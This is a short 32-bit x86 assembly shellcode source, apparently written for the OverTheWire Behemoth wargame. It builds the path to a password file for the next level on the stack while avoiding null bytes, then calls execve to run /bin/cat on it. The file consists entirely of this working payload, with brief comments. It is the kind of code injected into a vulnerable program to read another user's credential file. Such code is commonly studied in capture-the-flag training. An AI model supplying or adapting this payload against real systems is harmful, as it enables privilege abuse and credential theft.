BITS 32
 
xor eax, eax    ; the null byte
push eax
 
mov edx, esp    
push "/cat"
push "/bin"     
mov ebx, esp    

push eax        ; push "\0"
push "oth1"     
push "ehem"
push "///b"
push "pass"
push "oth_"
push "ehem"
push "///b"
push "/etc"     ; Creates "/etc///behemoth_pass///behemoth1\0"
mov ebp, esp    
 
push eax        
push ebp        ; Pointer to /etc///behemoth_pass///behemoth1\0
push ebx        
mov ecx, esp    

mov al, 11      ; execve("/bin/cat", (char*[]) {"/bin/cat", "/etc///behemoth_pass///behemoth1", NULL}, (char*[]) {NULL});
int 0x80        
